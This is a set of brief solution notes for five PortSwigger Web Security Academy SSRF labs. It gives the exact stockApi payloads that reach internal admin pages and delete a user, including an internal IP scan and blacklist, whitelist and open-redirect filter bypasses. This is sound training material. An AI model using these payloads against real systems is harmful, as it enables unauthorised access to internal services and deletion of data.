[lab: Basic SSRF against the local server]
url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
solution: 
    step-1: in burpsuite, change stockApi to stockApi=http://localhost/admin
    step-2: look at response, and copy url for deleting user 'carlos'. paste url in stockApi: stockApi=http://localhost/admin/delete?username=carlos

[lab: Basic SSRF against another back-end system]
url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
solution:
    step-1: in burpsuite, send intercept to intruder after clicking 'check stock'
    step-2: change 'stockApi' parameter to stockApi=http%3A%2F%2F192.168.0.ยง1ยง%3A8080%2Fadmin
    step-3: navigate to payloads; select 'numbers' for payload type; set payload options from 1 to 255 with 1 step and min integer digits=1 and max digits=3
    step-4: when a 200 response status is returned, stop the attack and view the response for the url of the delete user 'carlos'
    step-5: click 'action' then send the attack to repeater
    step-6: append url to delete 'carlos' to the stockApi parameter (i.e. - stockApi=http://192.168.0.218:8080/admin/delete?username=carlos)

[lab: SSRF with blacklist-based input filter]
url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
solution:
    step-1: using burpsuite, send proxy intercept (after clicking 'check stock') to intruder, and change value of 'stockApi' parameter to stockApi=http://LOCALHOST/ADMIN
    step-2: grab url of link to delete user 'carlos' and append it to the value parameter used in step 1, (stockApi=http://LOCALHOST/ADMIN/DELETE?username=carlos)

[lab: SSRF with whitelist-based input filter]
url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
solution: (note: I had to look at 3 of the hints to solve this lab. I was able to figure it out after reading the hint to double encode the '#'. It turns out there are 
          multiple solutions, as my solution is not the same as the one in the help, which is 'http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos')
    step-1: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080
    step-2: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080/admin/delete?username=carlos

[lab: SSRF with filter bypass via open redirection vulnerability]
url: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
solution: 
    step-1: view source of webpage, and extract open redirect '/product/nextProduct' with parameter 'path'
    step-2: paste open redirect into stockApi parameter, 'stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/'
    step-3: append portion response containing href to delete carlos onto string from step-2 ('stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos&')

